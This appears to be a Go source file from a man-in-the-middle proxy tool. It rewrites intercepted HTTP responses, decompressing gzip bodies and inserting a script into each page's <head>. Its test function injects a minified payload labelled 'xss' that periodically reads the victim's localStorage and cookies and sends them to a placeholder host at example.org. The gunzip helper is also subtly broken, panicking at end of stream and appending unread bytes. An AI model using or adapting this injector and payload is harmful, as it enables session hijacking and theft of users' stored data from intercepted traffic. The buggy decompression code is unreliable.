package main

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"strings"
)

func gUnzipData(data []byte) (resData []byte, err error) {
	b := bytes.NewBuffer(data)

	var r io.Reader
	r, err = gzip.NewReader(b)
	if err != nil {
		return
	}

	var bar []byte
	for {
		token := make([]byte, 4)
		_, err := r.Read(token)
		if err != nil {
			fmt.Printf("\nerr in unzipping: %v \n", err)
			panic(err)
			break
		}
		bar = append(bar, token...)
	}

	resData = bar

	return
}

func gZipData(data []byte) (compressedData []byte, err error) {
	var b bytes.Buffer
	gz := gzip.NewWriter(&b)

	_, err = gz.Write(data)
	if err != nil {
		return
	}

	if err = gz.Flush(); err != nil {
		return
	}

	if err = gz.Close(); err != nil {
		return
	}

	compressedData = b.Bytes()

	return
}

func getHeaderValue(headerKey string, headerStr *string) (headerValue string, err error) {
	cLen := headerKey + ": "
	splHEADER := strings.Split(*headerStr, "\r\n") //
	for _, hdr := range splHEADER {
		idx := strings.Index(hdr, cLen)
		if idx != -1 {
			return strings.TrimSpace(hdr[len(cLen):]), nil
		}
	}
	return headerValue, errors.New("Key not found")
}

func addAccessControl(headerStr *string, accessControl *string) {
	idx := strings.Index(*headerStr, *accessControl)
	if idx != -1 {
		return
	}
	*headerStr = strings.TrimSpace(*headerStr) + "\r\n" + *accessControl + "\r\n\r\n"
}

func httpDataHandler(_data *[]byte, doGzip bool, javaScript *string, verbose bool) (markAsModified bool) {
	defer func() {
		if r := recover(); r != nil {
			if verbose {
				fmt.Println("Recovered from panic in modifyHTTPResonse", r)
			}
			markAsModified = false
		}
	}()
	modifyHTTPResonse(_data, doGzip, javaScript)
	return true
}

func modifyHTTPResonse(_data *[]byte, doGzip bool, javaScript *string) {
	sep := "\r\n\r\n"
	content := *_data
	strData := string(content)
	residx := strings.Index(strData, sep)
	var HEADER string
	if residx != -1 {
		HEADER = string(content[:residx+len(sep)])
		content = content[residx+len(sep):]
	} else {
		panic("error parsing HTTP header")
	}

	if len(content) == 0 {
		panic("Unable to handle chunked encoding")
	}

	var uncompressedData []byte
	var uncompressedDataErr error
	if doGzip {
		fmt.Printf("\nunzipping contents: %v \n", doGzip)

		uncompressedData, uncompressedDataErr = gUnzipData(content)
		if uncompressedDataErr != nil {
			fmt.Printf("\nError unzipping contents: %v \n", uncompressedDataErr)
			panic(uncompressedDataErr)
		}
	} else {
		uncompressedData = content
	}

	repl := strings.Replace(string(uncompressedData), "<head>", "<head><script>"+*javaScript+"</script>", 1)
	repl = strings.Replace(repl, "<HEAD>", "<HEAD><script>"+*javaScript+"</script>", 1)

	var recomp []byte
	var recompErr error

	if doGzip {
		recomp, recompErr = gZipData([]byte(repl))
		if recompErr != nil {
			fmt.Printf("\nError recompressing contents: %v \n", recompErr)
			panic(recompErr)
		}
	} else {
		recomp = []byte(repl)
	}

	*_data = append([]byte(HEADER), recomp...)
}

func testInjectHTML() {
	content, _ := ioutil.ReadFile("req4.cap")
	fmt.Printf("BEFORE %v\n\n\n\n", string(content))
	xss := `var once=!0;setInterval(function(){try{if(once||.3>Math.random()){once=!1;var a="/?",b=(s=JSON.stringify(window.localStorage))&&2<s.length;b&&(a+="ls="+encodeURI(s));(d=document.cookie)&&0<d.length&&(b&&(a+="&"),a+="c="+encodeURI(d));if(2<a.length){var c=new XMLHttpRequest;c.open("GET","https://www.example.org/example"+a);c.send()}}}catch(e){}},8E3);`
	httpDataHandler(&content, true, &xss, true)
	fmt.Printf("AFTER %v\n\n\n\n", string(content))
}
